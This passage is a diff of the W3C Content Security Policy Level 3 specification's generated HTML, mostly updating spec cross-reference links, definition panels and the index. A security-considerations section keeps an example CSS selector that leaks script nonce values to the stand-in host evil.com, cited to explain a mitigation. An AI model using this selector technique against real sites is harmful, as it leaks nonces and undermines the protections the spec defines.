         <p>Stylesheet requests originating from a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element" id="ref-for-the-link-element①">link</a></code> element.</p>
        <li data-md>
-        <p>Stylesheet requests originating from the <a class="css" data-link-type="at-rule" href="https://drafts.csswg.org/css-cascade-4/#at-ruledef-import" id="ref-for-at-ruledef-import"><code>@import</code></a> rule.</p>
+        <p>Stylesheet requests originating from the <a class="css" data-link-type="at-rule" href="https://drafts.csswg.org/css-cascade-5/#at-ruledef-import" id="ref-for-at-ruledef-import"><code>@import</code></a> rule.</p>
        <li data-md>
         <p>Stylesheet requests originating from a <code>Link</code> HTTP response header
   field <a data-link-type="biblio" href="#biblio-rfc8288">[RFC8288]</a>.</p>
@@ -4050,7 +4456,7 @@ directive-value = <a data-link-type="grammar" href="#grammardef-serialized-sourc
      <li data-md>
       <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③①">Responses</a> to style requests MUST pass through <a href="#should-block-response">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>.</p>
      <li data-md>
-      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element">style</a></code> blocks MUST pass through <a href="#should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. The
+      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element">style</a></code> blocks MUST pass through <a href="#should-block-inline" id="ref-for-should-block-inline⑤">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. The
   styles will be blocked unless every policy allows inline style, either
   implicitly by not specifying a <code>style-src</code> (or <code>default-src</code>) directive,
   or explicitly, by specifying "<code>unsafe-inline</code>", a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source③">nonce-source</a> or a <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source③">hash-source</a> that matches
@@ -4261,7 +4667,7 @@ directive-value = <a data-link-type="grammar" href="#grammardef-serialized-sourc
 directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑦">serialized-source-list</a>
 </pre>
     <p>The following algorithm is called during HTML’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url" id="ref-for-set-the-frozen-base-url①">set the frozen base url</a> algorithm in order to monitor and enforce this directive:</p>
-    <h5 class="heading settled algorithm" data-algorithm="Is base allowed for document?" data-level="6.2.1.1" id="allow-base-for-document"><span class="secno">6.2.1.1. </span><span class="content"> Is <var>base</var> allowed for <var>document</var>? </span><a class="self-link" href="#allow-base-for-document"></a></h5>
+    <h5 class="heading settled dfn-paneled algorithm" data-algorithm="Is base allowed for document?" data-dfn-type="dfn" data-export data-level="6.2.1.1" data-lt="Is base allowed for document?" id="allow-base-for-document"><span class="secno">6.2.1.1. </span><span class="content"> Is <var>base</var> allowed for <var>document</var>? </span><a class="self-link" href="#allow-base-for-document" id="ref-for-allow-base-for-document①"></a></h5>
     <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑤">URL</a></code> (<var>base</var>), and a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑤">Document</a></code> (<var>document</var>), this algorithm
   returns "<code>Allowed</code>" if <var>base</var> may be used as the value of a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element②">base</a></code> element’s <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href①">href</a></code> attribute, and "<code>Blocked</code>" otherwise:</p>
     <ol>
@@ -4340,7 +4746,7 @@ directive-value = <a data-link-type="grammar" href="#grammardef-media-type-list"
 <c- p>&lt;</c-><c- f>object</c-> <c- e>data</c-><c- o>=</c-><c- s>"https://example.com/flash"</c-> <c- e>type</c-><c- o>=</c-><c- s>"application/x-shockwave-flash"</c-><c- p>>&lt;/</c-><c- f>object</c-><c- p>></c->
 </pre>
     </div>
-    <h5 class="heading settled algorithm" data-algorithm="plugin-types Post-Request Check" data-dfn-type="dfn" data-level="6.2.2.1" data-lt="plugin-types Post-Request Check" data-noexport id="plugin-types-post-request-check"><span class="secno">6.2.2.1. </span><span class="content"> <code>plugin-types</code> Post-Request Check </span><a class="self-link" href="#plugin-types-post-request-check"></a></h5>
+    <h5 class="heading settled dfn-paneled algorithm" data-algorithm="plugin-types Post-Request Check" data-dfn-type="dfn" data-level="6.2.2.1" data-lt="plugin-types Post-Request Check" data-noexport id="plugin-types-post-request-check"><span class="secno">6.2.2.1. </span><span class="content"> <code>plugin-types</code> Post-Request Check </span><a class="self-link" href="#plugin-types-post-request-check" id="ref-for-plugin-types-post-request-check"></a></h5>
     <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑨">post-request check</a> algorithm is as
   follows:</p>
     <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤④">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑤">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑨">policy</a> (<var>policy</var>):</p>
@@ -4362,8 +4768,8 @@ directive-value = <a data-link-type="grammar" href="#grammardef-media-type-list"
       <p>Return "<code>Allowed</code>".</p>
     </ol>
     <h5 class="heading settled dfn-paneled algorithm" data-algorithm="Should plugin element be blocked a priori by Content
-    Security Policy?:" data-dfn-type="dfn" data-level="6.2.2.2" data-lt="Should plugin element be blocked a priori by Content Security Policy?:" data-noexport id="should-plugin-element-be-blocked-a-priori-by-content-security-policy"><span class="secno">6.2.2.2. </span><span class="content"> Should <var>plugin element</var> be blocked <i lang="la">a priori</i> by Content
-    Security Policy?: </span></h5>
+    Security Policy?:" data-dfn-type="dfn" data-export data-level="6.2.2.2" data-lt="Should plugin element be blocked a priori by Content Security Policy?:" id="should-plugin-element-be-blocked-a-priori-by-content-security-policy"><span class="secno">6.2.2.2. </span><span class="content"> Should <var>plugin element</var> be blocked <i lang="la">a priori</i> by Content
+    Security Policy?: </span><a class="self-link" href="#should-plugin-element-be-blocked-a-priori-by-content-security-policy" id="ref-for-should-plugin-element-be-blocked-a-priori-by-content-security-policy①"></a></h5>
     <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑨">Element</a></code> (<var>plugin element</var>), this algorithm returns "<code>Blocked</code>"
   or "<code>Allowed</code>" based on the element’s <code>type</code> attribute and the policy applied to
   its document:</p>
@@ -4693,7 +5099,7 @@ directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/
   the "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic"><code>'strict-dynamic'</code></a>" <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source③">keyword-source</a>:</p>
         <ol>
          <li data-md>
-          <p>If the <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata①">parser metadata</a> is <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted①">"parser-inserted"</a>, return "<code>Blocked</code>".</p>
+          <p>If the <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata①">parser metadata</a> is <a data-link-type="dfn">"parser-inserted"</a>, return "<code>Blocked</code>".</p>
           <p>Otherwise, return "<code>Allowed</code>".</p>
           <p class="note" role="note"><span>Note:</span> "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic①"><code>'strict-dynamic'</code></a>" is explained in more detail
   in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
@@ -4719,7 +5125,7 @@ directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/
   "<code>Allowed</code>".</p>
        <li data-md>
         <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑥④">value</a> contains
-  "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic②"><code>'strict-dynamic'</code></a>", and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata②">parser metadata</a> is not <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted②">"parser-inserted"</a>,
+  "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic②"><code>'strict-dynamic'</code></a>", and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata②">parser metadata</a> is not <a data-link-type="dfn">"parser-inserted"</a>,
   return "<code>Allowed</code>".</p>
        <li data-md>
         <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑥⑤">value</a>,
@@ -4775,7 +5181,7 @@ directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/
   and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧①">policy</a> (<var>policy</var>), this algorithm returns the result of executing <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> on <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url④">url</a>, <var>source list</var>, <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin⑤">self-origin</a>, and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-redirect-count" id="ref-for-concept-request-redirect-count①">redirect count</a>.</p>
     <p class="note" role="note"><span>Note:</span> This is generally used in <a data-link-type="dfn" href="#directives" id="ref-for-directives③③">directives</a>' <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check②②">post-request check</a> algorithms to verify that a given <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response④③">response</a> is reasonable.</p>
     <h5 class="heading settled algorithm" data-algorithm="Does url match source list in origin with redirect count?" data-level="6.6.2.5" id="match-url-to-source-list"><span class="secno">6.6.2.5. </span><span class="content"> Does <var>url</var> match <var>source list</var> in <var>origin</var> with <var>redirect count</var>? </span><a class="self-link" href="#match-url-to-source-list"></a></h5>
-    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑨">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑤">source list</a> (<var>source list</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin" id="ref-for-concept-origin①">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this
+    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑨">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑤">source list</a> (<var>source list</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/infrastructure.html#concept-request-origin" id="ref-for-concept-request-origin②">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this
   algorithm returns "<code>Matches</code>" if the URL matches one or more source
   expressions in <var>source list</var>, or "<code>Does Not Match</code>" otherwise:</p>
     <ol>
@@ -4801,10 +5207,10 @@ directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/
       <p>Return "<code>Does Not Match</code>".</p>
     </ol>
     <h5 class="heading settled algorithm" data-algorithm="Does url match expression in origin with redirect count?" data-level="6.6.2.6" id="match-url-to-source-expression"><span class="secno">6.6.2.6. </span><span class="content"> Does <var>url</var> match <var>expression</var> in <var>origin</var> with <var>redirect count</var>? </span><a class="self-link" href="#match-url-to-source-expression"></a></h5>
-    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①⓪">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑨">source expression</a> (<var>expression</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin" id="ref-for-concept-origin②">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this algorithm
+    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①⓪">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑨">source expression</a> (<var>expression</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/infrastructure.html#concept-request-origin" id="ref-for-concept-request-origin③">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this algorithm
   returns "<code>Matches</code>" if <var>url</var> matches <var>expression</var>, and "<code>Does Not Match</code>"
   otherwise.</p>
-    <p class="note" role="note"><span>Note:</span> <var>origin</var> is the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin" id="ref-for-concept-origin③">origin</a> of the resource relative to which the <var>expression</var> should be resolved. "<code>'self'</code>", for instance, will have distinct
+    <p class="note" role="note"><span>Note:</span> <var>origin</var> is the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/infrastructure.html#concept-request-origin" id="ref-for-concept-request-origin④">origin</a> of the resource relative to which the <var>expression</var> should be resolved. "<code>'self'</code>", for instance, will have distinct
   meaning depending on that bit of context.</p>
     <ol>
      <li data-md>
@@ -5456,7 +5862,7 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
   CSS selectors are the best example: through clever use of
   prefix/postfix text matching selectors values can be sent out to an
   attacker’s server for reuse. Example:</p>
-<pre class="highlight"><c- f>script[nonce=a] </c-><c- p>{</c-> <c- k>background</c-><c- p>:</c-> <c- nf>url</c-><c- p>(</c-><c- s>"https://evil.com/nonce?a"</c-><c- p>);}</c->
+<pre class="highlight">script<c- p>[</c->nonce=a<c- p>]</c-> <c- p>{</c-> <c- k>background</c-><c- p>:</c-> <c- nf>url</c-><c- p>(</c-><c- s>"https://evil.com/nonce?a"</c-><c- p>);}</c->
 </pre>
     <p>The <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce①">nonce</a></code> section talks about mitigating these types
   of attacks by hiding the nonce from the element’s content attribute and
@@ -5523,7 +5929,7 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
   themselves into insecure URLs via policies like <code>script-src http://example.com</code>. As described in <a href="#match-schemes">§ 6.6.2.7 scheme-part matching</a>, the scheme portion of a source expression will always allow upgrading to a
   secure variant.</p>
     <h3 class="heading settled" data-level="7.8" id="security-inherit-csp"><span class="secno">7.8. </span><span class="content"> CSP Inheriting to avoid bypasses </span><a class="self-link" href="#security-inherit-csp"></a></h3>
-    <p>As described in <a href="#initialize-document-csp">§ 4.2.1 Initialize a Document's CSP list</a> and <a href="#initialize-global-object-csp">§ 4.2.2 Initialize a global object’s CSP list</a>,
+    <p>As described in <a href="#initialize-document-csp" id="ref-for-initialize-document-csp⑥">§ 4.2.1 Initialize a Document's CSP list</a> and <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp④">§ 4.2.2 Initialize a global object’s CSP list</a>,
   documents loaded from <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme⑤">local schemes</a> will inherit a copy of the
   policies in the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#source-browsing-context" id="ref-for-source-browsing-context①">source browsing context</a>. The goal is to ensure that a page can’t
   bypass its policy by embedding a frame or opening a new window containing
@@ -5596,7 +6002,7 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
       <p><a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑧">hash-source</a> and <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑨">nonce-source</a> expressions
   will be honored.</p>
      <li data-md>
-      <p>Script requests which are triggered by non-<a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted③">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①③">script</a></code> elements are allowed.</p>
+      <p>Script requests which are triggered by non-<a data-link-type="dfn">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①③">script</a></code> elements are allowed.</p>
     </ol>
     <p>The first change allows you to deploy "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑤"><code>'strict-dynamic'</code></a> in a
   backwards compatible way, without requiring user-agent sniffing: the policy <code>'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic'</code> will act like <code>'unsafe-inline' https:</code> in browsers that support CSP1, <code>https: 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'</code> in browsers that support CSP2, and <code>'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'</code> in browsers that
@@ -5622,8 +6028,8 @@ document<c- p>.</c->head<c- p>.</c->appendChild<c- p>(</c->s<c- p>);</c->
 
 document<c- p>.</c->write<c- p>(</c-><c- t>'&lt;scr'</c-> <c- o>+</c-> <c- t>'ipt src="/sadness.js">&lt;/scr'</c-> <c- o>+</c-> <c- t>'ipt>'</c-><c- p>);</c->
 </pre>
-     <p><code>dependency.js</code> will load, as the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①④">script</a></code> element created by <code>createElement()</code> is not <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted④">"parser-inserted"</a>.</p>
-     <p><code>sadness.js</code> will <em>not</em> load, however, as <code>document.write()</code> produces <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑤">script</a></code> elements which are <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" id="ref-for-parser-inserted⑤">"parser-inserted"</a>.</p>
+     <p><code>dependency.js</code> will load, as the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①④">script</a></code> element created by <code>createElement()</code> is not <a data-link-type="dfn">"parser-inserted"</a>.</p>
+     <p><code>sadness.js</code> will <em>not</em> load, however, as <code>document.write()</code> produces <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑤">script</a></code> elements which are <a data-link-type="dfn">"parser-inserted"</a>.</p>
     </div>
     <p class="note" role="note"><span>Note:</span> With <a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑦">'strict-dynamic'</a>, scripts created at runtime will be
   allowed to execute. If the location of such a script can be controlled by an
@@ -5971,7 +6377,10 @@ rest of Google’s CSP Cabal.</p>
    <li><a href="#grammardef-host-source">host-source</a><span>, in §2.3.1</span>
    <li><a href="#img-src">img-src</a><span>, in §6.1.6</span>
    <li><a href="#directive-initialization">initialization</a><span>, in §2.3</span>
+   <li><a href="#initialize-document-csp">Initialize a Document's CSP list</a><span>, in §4.2</span>
+   <li><a href="#initialize-global-object-csp">Initialize a global object’s CSP list</a><span>, in §4.2.1</span>
    <li><a href="#directive-inline-check">inline check</a><span>, in §2.3</span>
+   <li><a href="#allow-base-for-document">Is base allowed for document?</a><span>, in §6.2.1</span>
    <li><a href="#grammardef-keyword-source">keyword-source</a><span>, in §2.3.1</span>
    <li>
     lineno
@@ -6068,6 +6477,9 @@ rest of Google’s CSP Cabal.</p>
    <li><a href="#grammardef-serialized-policy-list">serialized-policy-list</a><span>, in §2.2</span>
    <li><a href="#serialized-source-list">serialized source list</a><span>, in §2.3.1</span>
    <li><a href="#grammardef-serialized-source-list">serialized-source-list</a><span>, in §2.3.1</span>
+   <li><a href="#should-block-inline">Should element’s inline type behavior be blocked by Content Security Policy?</a><span>, in §4.2.3</span>
+   <li><a href="#should-block-navigation-request">Should navigation request of type be blocked by Content Security Policy?</a><span>, in §4.2.4</span>
+   <li><a href="#should-block-navigation-response">Should navigation response to navigation request of type in target be blocked by Content Security Policy?</a><span>, in §4.2.5</span>
    <li><a href="#should-plugin-element-be-blocked-a-priori-by-content-security-policy">Should plugin element be blocked a priori by Content Security Policy?:</a><span>, in §6.2.2.1</span>
    <li><a href="#policy-source">source</a><span>, in §2.2</span>
    <li><a href="#source-expression">source expression</a><span>, in §2.3.1</span>
@@ -6104,7 +6516,7 @@ rest of Google’s CSP Cabal.</p>
    <li><a href="#worker-src">worker-src</a><span>, in §6.1.17</span>
   </ul>
   <aside class="dfn-panel" data-for="term-for-at-ruledef-import">
-   <a href="https://drafts.csswg.org/css-cascade-4/#at-ruledef-import">https://drafts.csswg.org/css-cascade-4/#at-ruledef-import</a><b>Referenced in:</b>
+   <a href="https://drafts.csswg.org/css-cascade-5/#at-ruledef-import">https://drafts.csswg.org/css-cascade-5/#at-ruledef-import</a><b>Referenced in:</b>
    <ul>
     <li><a href="#ref-for-at-ruledef-import">6.1.14. style-src</a>
    </ul>
@@ -6534,7 +6946,7 @@ rest of Google’s CSP Cabal.</p>
   <aside class="dfn-panel" data-for="term-for-concept-request-origin">
    <a href="https://fetch.spec.whatwg.org/#concept-request-origin">https://fetch.spec.whatwg.org/#concept-request-origin</a><b>Referenced in:</b>
    <ul>
-    <li><a href="#ref-for-concept-request-origin">5.3. 
+    <li><a href="#ref-for-concept-request-origin①">5.3. 
     Report a violation </a>
    </ul>
   </aside>
@@ -6812,18 +7224,6 @@ rest of Google’s CSP Cabal.</p>
     Report a violation </a>
    </ul>
   </aside>
-  <aside class="dfn-panel" data-for="term-for-parser-inserted">
-   <a href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted">https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted</a><b>Referenced in:</b>
-   <ul>
-    <li><a href="#ref-for-parser-inserted">1.3. Changes from Level 2</a>
-    <li><a href="#ref-for-parser-inserted①">6.6.1.1. 
-    Script directives pre-request check </a>
-    <li><a href="#ref-for-parser-inserted②">6.6.1.2. 
-    Script directives post-request check </a>
-    <li><a href="#ref-for-parser-inserted③">8.2. 
-    Usage of "'strict-dynamic'" </a> <a href="#ref-for-parser-inserted④">(2)</a> <a href="#ref-for-parser-inserted⑤">(3)</a>
-   </ul>
-  </aside>
   <aside class="dfn-panel" data-for="term-for-dedicatedworkerglobalscope">
    <a href="https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope">https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope</a><b>Referenced in:</b>
    <ul>
@@ -6871,6 +7271,18 @@ rest of Google’s CSP Cabal.</p>
     <li><a href="#ref-for-workerglobalscope①">4.2. 
     Integration with HTML </a> <a href="#ref-for-workerglobalscope②">(2)</a>
     <li><a href="#ref-for-workerglobalscope③">4.2.3. 
+    Retrieve the CSP list of an object </a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="term-for-workletglobalscope">
+   <a href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope">https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope</a><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-workletglobalscope">2.2. Policies</a>
+    <li><a href="#ref-for-workletglobalscope①">4.2. 
+    Integration with HTML </a> <a href="#ref-for-workletglobalscope②">(2)</a>
+    <li><a href="#ref-for-workletglobalscope③">4.2.2. 
+    Initialize a global object’s CSP list </a>
+    <li><a href="#ref-for-workletglobalscope④">4.2.3. 
     Retrieve the CSP list of an object </a>
    </ul>
   </aside>
@@ -6938,13 +7350,6 @@ rest of Google’s CSP Cabal.</p>
    <a href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content">https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content</a><b>Referenced in:</b>
    <ul>
     <li><a href="#ref-for-attr-meta-content">3.3. 
-    The &lt;meta> element </a>
-   </ul>
-  </aside>
-  <aside class="dfn-panel" data-for="term-for-attr-meta-http-equiv-content-security-policy">
-   <a href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-content-security-policy">https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-content-security-policy</a><b>Referenced in:</b>
-   <ul>
-    <li><a href="#ref-for-attr-meta-http-equiv-content-security-policy">3.3. 
     The &lt;meta> element </a>
    </ul>
   </aside>
@@ -7868,20 +8273,8 @@ rest of Google’s CSP Cabal.</p>
     Violation DOM Events </a> <a href="#ref-for-idl-unsigned-short②">(2)</a>
    </ul>
   </aside>
-  <aside class="dfn-panel" data-for="term-for-workletglobalscope">
-   <a href="https://drafts.css-houdini.org/worklets/#workletglobalscope">https://drafts.css-houdini.org/worklets/#workletglobalscope</a><b>Referenced in:</b>
-   <ul>
-    <li><a href="#ref-for-workletglobalscope">2.2. Policies</a>
-    <li><a href="#ref-for-workletglobalscope①">4.2. 
-    Integration with HTML </a> <a href="#ref-for-workletglobalscope②">(2)</a>
-    <li><a href="#ref-for-workletglobalscope③">4.2.2. 
-    Initialize a global object’s CSP list </a>
-    <li><a href="#ref-for-workletglobalscope④">4.2.3. 
-    Retrieve the CSP list of an object </a>
-   </ul>
-  </aside>
   <aside class="dfn-panel" data-for="term-for-workletglobalscope-owner-document">
-   <a href="https://drafts.css-houdini.org/worklets/#workletglobalscope-owner-document">https://drafts.css-houdini.org/worklets/#workletglobalscope-owner-document</a><b>Referenced in:</b>
+   <a href="https://www.w3.org/TR/worklets-1/#workletglobalscope-owner-document">https://www.w3.org/TR/worklets-1/#workletglobalscope-owner-document</a><b>Referenced in:</b>
    <ul>
     <li><a href="#ref-for-workletglobalscope-owner-document">4.2.2. 
     Initialize a global object’s CSP list </a>
@@ -7890,281 +8283,279 @@ rest of Google’s CSP Cabal.</p>
   <h3 class="no-num no-ref heading settled" id="index-defined-elsewhere"><span class="content">Terms defined by reference</span><a class="self-link" href="#index-defined-elsewhere"></a></h3>
   <ul class="index">
    <li>
-    <a data-link-type="biblio">[css-cascade-4]</a> defines the following terms:
+    <a data-link-type="biblio">[css-cascade-5]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-at-ruledef-import" style="color:initial">@import</span>
+     <li><span class="dfn-paneled" id="term-for-at-ruledef-import">@import</span>
     </ul>
    <li>
     <a data-link-type="biblio">[CSSOM]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-insert-a-css-rule" style="color:initial">insert a css rule</span>
-     <li><span class="dfn-paneled" id="term-for-parse-a-css-declaration-block" style="color:initial">parse a css declaration block</span>
-     <li><span class="dfn-paneled" id="term-for-parse-a-css-rule" style="color:initial">parse a css rule</span>
-     <li><span class="dfn-paneled" id="term-for-parse-a-group-of-selectors" style="color:initial">parse a group of selectors</span>
+     <li><span class="dfn-paneled" id="term-for-insert-a-css-rule">insert a css rule</span>
+     <li><span class="dfn-paneled" id="term-for-parse-a-css-declaration-block">parse a css declaration block</span>
+     <li><span class="dfn-paneled" id="term-for-parse-a-css-rule">parse a css rule</span>
+     <li><span class="dfn-paneled" id="term-for-parse-a-group-of-selectors">parse a group of selectors</span>
     </ul>
    <li>
     <a data-link-type="biblio">[DOM]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-document" style="color:initial">Document</span>
-     <li><span class="dfn-paneled" id="term-for-element" style="color:initial">Element</span>
-     <li><span class="dfn-paneled" id="term-for-event" style="color:initial">Event</span>
-     <li><span class="dfn-paneled" id="term-for-dictdef-eventinit" style="color:initial">EventInit</span>
-     <li><span class="dfn-paneled" id="term-for-dom-event-bubbles" style="color:initial">bubbles</span>
-     <li><span class="dfn-paneled" id="term-for-dom-event-composed" style="color:initial">composed</span>
-     <li><span class="dfn-paneled" id="term-for-connected" style="color:initial">connected</span>
-     <li><span class="dfn-paneled" id="term-for-concept-document" style="color:initial">document</span>
-     <li><span class="dfn-paneled" id="term-for-concept-event-fire" style="color:initial">fire an event</span>
-     <li><span class="dfn-paneled" id="term-for-concept-node-document" style="color:initial">node document</span>
-     <li><span class="dfn-paneled" id="term-for-concept-shadow-including-root" style="color:initial">shadow-including root</span>
-     <li><span class="dfn-paneled" id="term-for-dom-event-target" style="color:initial">target</span>
+     <li><span class="dfn-paneled" id="term-for-document">Document</span>
+     <li><span class="dfn-paneled" id="term-for-element">Element</span>
+     <li><span class="dfn-paneled" id="term-for-event">Event</span>
+     <li><span class="dfn-paneled" id="term-for-dictdef-eventinit">EventInit</span>
+     <li><span class="dfn-paneled" id="term-for-dom-event-bubbles">bubbles</span>
+     <li><span class="dfn-paneled" id="term-for-dom-event-composed">composed</span>
+     <li><span class="dfn-paneled" id="term-for-connected">connected</span>
+     <li><span class="dfn-paneled" id="term-for-concept-document">document</span>
+     <li><span class="dfn-paneled" id="term-for-concept-event-fire">fire an event</span>
+     <li><span class="dfn-paneled" id="term-for-concept-node-document">node document</span>
